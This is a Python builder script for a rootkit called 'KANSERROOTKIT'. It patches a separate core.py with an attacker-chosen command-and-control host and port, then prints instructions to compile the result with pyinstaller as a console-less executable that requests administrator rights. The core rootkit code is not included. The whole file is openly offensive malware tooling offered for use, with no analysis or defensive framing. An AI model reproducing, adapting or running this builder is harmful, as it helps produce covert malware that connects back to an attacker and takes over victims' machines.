#!/usr/bin/env python3
# KANSERROOTKIT BUILDER
import os, sys, socket

def build(c2_host=None, c2_port=8888):
    if not c2_host:
        c2_host = input("C2 IP: ").strip() or socket.gethostbyname(socket.gethostname())
    with open("core.py", "r", encoding="utf-8") as f: src = f.read()
    src = src.replace('C2_HOST = "127.0.0.1"', f'C2_HOST = "{c2_host}"')
    src = src.replace('C2_PORT = 8888', f'C2_PORT = {c2_port}')
    with open("rootkit_built.py", "w") as f: f.write(src)
    print(f"[+] rootkit_built.py — C2: {c2_host}:{c2_port}")
    print("[+] ADMIN GEREKIR! pyinstaller --onefile --noconsole --uac-admin rootkit_built.py")

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(); p.add_argument("--host"); p.add_argument("--port", type=int, default=8888)
    a = p.parse_args(); build(a.host, a.port)
